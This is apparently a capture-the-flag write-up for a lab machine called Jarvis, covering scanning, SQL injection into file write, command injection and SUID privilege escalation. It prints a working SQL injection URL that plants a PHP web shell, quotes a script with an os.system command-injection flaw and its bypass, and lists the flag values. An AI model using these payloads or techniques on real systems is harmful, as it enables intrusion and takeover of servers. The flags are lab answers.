# Jarvis

## Overview

This was a good box with sql injection to inject file and from there a command injection leads to the user. A SETUID bit executable helps to get the root.

![Jarvis.png](uploads/Jarvis.png)

**Name -** Jarvis

**Difficulty -** Medium

**OS -** Linux

**Points -** 30

## Information Gathering

### Port Scan

Basic Scan

```bash
╰─ rustscan -a 10.129.77.175 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.77.175:22
Open 10.129.77.175:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 20:21 +06
Initiating Ping Scan at 20:21
Scanning 10.129.77.175 [4 ports]
Completed Ping Scan at 20:21, 2.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:21
Completed Parallel DNS resolution of 1 host. at 20:21, 5.04s elapsed
DNS resolution of 1 IPs took 5.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating SYN Stealth Scan at 20:21
Scanning 10.129.77.175 [2 ports]
Discovered open port 22/tcp on 10.129.77.175
Discovered open port 80/tcp on 10.129.77.175
Completed SYN Stealth Scan at 20:21, 0.20s elapsed (2 total ports)
Nmap scan report for 10.129.77.175
Host is up, received reset ttl 62 (1.5s latency).
Scanned at 2023-06-21 20:21:43 +06 for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
           Raw packets sent: 6 (240B) | Rcvd: 2326 (93.088KB)
```

Version Scan

```bash
╭╴root @ …/c/Users/SiliconBits took 17s
╰─ nmap 10.129.77.175 -p22,80 -sC -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 20:25 +06
Nmap scan report for 10.129.77.175
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03f34e22363e3b813079ed4967651667 (RSA)
|   256 25d808a84d6de8d2f8434a2c20c85af6 (ECDSA)
|_  256 77d4ae1fb0be151ff8cdc8153ac369e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.08 seconds
```

### **HTTP Enumeration**

Visiting the website gives us the following

![Untitled](uploads/Untitled.png)

After roaming around the website I got the following endpoint

![Untitled](uploads/Untitled%201.png)

The url [http://supersecurehotel.htb/room.php?cod=1](http://supersecurehotel.htb/room.php?cod=1) contains sql injection. I first tried to fetch some data. But there was no important data. So, I tried to upload file through sql injection and It was successful with the following

```
http://supersecurehotel.htb/room.php?cod=-1 UNION SELECT 1,2,3,4,"<?php system($_GET['cmd']); ?>",6,7 into outfile "/var/www/html/test1.php"-- -
```

It created a test1.php file. and after running that file, I got command injection

![Untitled](uploads/Untitled%202.png)

I improved it to a reverse shell

![Untitled](uploads/Untitled%203.png)

## Getting User.txt

The user www-data has sudo access to run a specific file

![Untitled](uploads/Untitled%204.png)

The file /var/www/Admin-Utilities/simpler.py contains the following

```python
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''

* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *

Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

The exec_ping function is vulnerable. It is not filtering `$` symbol. so, I inject command to make an SUID file to got shell as pepper. I did it in three stages. 1st stage is to copy /bin/bash to /tmp folder

![Untitled](uploads/Untitled%205.png)

Then making it SUID executable

![Untitled](uploads/Untitled%206.png)

Then set the GID also

![Untitled](uploads/Untitled%207.png)

And after executing those three commands, I got an SUID binary

![Untitled](uploads/Untitled%208.png)

Now, Running that file gives me the shell as pepper and also I fetched the flag

![Untitled](uploads/Untitled%209.png)

User Flag - 13dc5f20fc112eea140b196e647389c8

## Getting root.txt

I found an SUID binary to exploit to get to root

![Untitled](uploads/Untitled%2010.png)

It was easy to exploit this with the help of [gtfobins](https://gtfobins.github.io/gtfobins/systemctl/)

![Untitled](uploads/Untitled%2011.png)

After that I found the root flag

![Untitled](uploads/Untitled%2012.png)

Root Flag - 1d67ff1c75cc7351344f010e30aaffea

## Flags

**user.txt -** 13dc5f20fc112eea140b196e647389c8

**root.txt -** 1d67ff1c75cc7351344f010e30aaffea
